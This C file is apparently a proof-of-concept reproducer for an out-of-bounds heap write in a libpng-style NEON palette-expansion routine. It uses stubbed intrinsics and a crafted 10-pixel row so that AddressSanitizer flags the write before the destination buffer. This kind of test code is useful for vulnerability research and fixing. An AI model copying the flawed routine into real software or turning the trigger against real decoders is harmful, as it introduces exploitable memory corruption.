#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Minimal libpng-like typedefs */
typedef uint8_t png_byte;
typedef uint32_t png_uint_32;
typedef struct { png_byte red, green, blue; } png_color;

_Static_assert(sizeof(png_color) == 3, "png_color must be 3 bytes");

/* Stub out png_debug used by the vulnerable function */
#define png_debug(level, msg) ((void)0)

/* Portable stubs for the ARM NEON intrinsics used by the function */
typedef struct { png_byte val0[8]; png_byte val1[8]; png_byte val2[8]; } uint8x8x3_t;

static inline uint8x8x3_t vld3_dup_u8(const png_byte *p)
{
    uint8x8x3_t cur;
    for (int k = 0; k < 8; ++k) {
        cur.val0[k] = p[0];
        cur.val1[k] = p[1];
        cur.val2[k] = p[2];
    }
    return cur;
}

static inline uint8x8x3_t vld3_lane_u8(const png_byte *p, uint8x8x3_t cur, int lane)
{
    if (lane >= 0 && lane < 8) {
        cur.val0[lane] = p[0];
        cur.val1[lane] = p[1];
        cur.val2[lane] = p[2];
    }
    return cur;
}

static inline void vst3_u8(void *dp_void, uint8x8x3_t cur)
{
    png_byte *dp = (png_byte *)dp_void;
    /* Interleaved store of 8 RGB triples => 24 bytes */
    for (int k = 0; k < 8; ++k) {
        dp[3*k + 0] = cur.val0[k];
        dp[3*k + 1] = cur.val1[k];
        dp[3*k + 2] = cur.val2[k];
    }
}

/* Vulnerable function copied and minimally adapted to be self-contained */
static png_uint_32
png_target_do_expand_palette_rgb8_neon(const png_color *paletteIn,
    png_uint_32 row_width, const png_byte **ssp, png_byte **ddp)
{
    const png_byte *palette = (const png_byte *)paletteIn;

    const png_uint_32 pixels_per_chunk = 8;
    png_uint_32 i;

    png_debug(1, "in png_do_expand_palette_rgb8_neon");

    if (row_width <= pixels_per_chunk)
       return 0;

    /* Seeking this back by 8 pixels x 3 bytes. */
    *ddp = *ddp - ((pixels_per_chunk * sizeof(png_color)) - 1);

    for (i = 0; i < row_width; i += pixels_per_chunk)
    {
       uint8x8x3_t cur;
       const png_byte *sp = *ssp - i;
       png_byte *dp = *ddp - ((i << 1) + i);
       cur = vld3_dup_u8(palette + sizeof(png_color) * (*(sp - 7)));
       cur = vld3_lane_u8(palette + sizeof(png_color) * (*(sp - 6)), cur, 1);
       cur = vld3_lane_u8(palette + sizeof(png_color) * (*(sp - 5)), cur, 2);
       cur = vld3_lane_u8(palette + sizeof(png_color) * (*(sp - 4)), cur, 3);
       cur = vld3_lane_u8(palette + sizeof(png_color) * (*(sp - 3)), cur, 4);
       cur = vld3_lane_u8(palette + sizeof(png_color) * (*(sp - 2)), cur, 5);
       cur = vld3_lane_u8(palette + sizeof(png_color) * (*(sp - 1)), cur, 6);
       cur = vld3_lane_u8(palette + sizeof(png_color) * (*(sp - 0)), cur, 7);
       /* OOB write happens here when row_width is not a multiple of 8 */
       vst3_u8((void *)dp, cur);
    }

    if (i != row_width)
    {
       /* Remove the amount that wasn't processed. */
       i -= pixels_per_chunk;
    }

    /* Decrement output pointers. */
    *ssp = *ssp - i;
    *ddp = *ddp - ((i << 1) + i);
    return i;
}

int main(void)
{
    /* Craft a palette with 256 RGB entries */
    png_color palette[256];
    for (int i = 0; i < 256; ++i) {
        palette[i].red   = (png_byte)i;
        palette[i].green = (png_byte)(i ^ 0x55);
        palette[i].blue  = (png_byte)(i ^ 0xAA);
    }

    /* Choose a row width that is >8 and not a multiple of 8 to trigger the bug */
    const png_uint_32 row_width = 10; /* 10 causes 2 iterations: i=0 and i=8 */

    /* Source: allocate extra headroom so source reads don't fault before the write */
    const size_t extra = 32; /* ensures sp-15..sp is within allocated range */
    png_byte *src = (png_byte *)malloc(extra + row_width);
    if (!src) return 1;

    /* Fill source indices with valid palette indices */
    for (size_t i = 0; i < extra + row_width; ++i)
        src[i] = (png_byte)(i & 0xFF);

    /* Destination: allocate exactly row_width*3 bytes to expose OOB-before-start */
    png_byte *dst = (png_byte *)malloc(row_width * 3);
    if (!dst) return 1;
    memset(dst, 0xCC, row_width * 3);

    /* Set pointers to mimic the library's backward-processing expectations */
    const png_byte *ssp = src + extra + row_width - 1;         /* end of logical row */
    png_byte *ddp = dst + (row_width * 3) - 1;                  /* end of destination row */

    /* Call the vulnerable routine. ASan should report an OOB write in vst3_u8. */
    (void)png_target_do_expand_palette_rgb8_neon(palette, row_width, &ssp, &ddp);

    /* If the bug didn't crash (it should with ASan), print something to avoid unused warnings */
    printf("Done. dst[0]=%u dst[last]=%u\n", (unsigned)dst[0], (unsigned)dst[row_width*3 - 1]);

    free(src);
    free(dst);
    return 0;
}
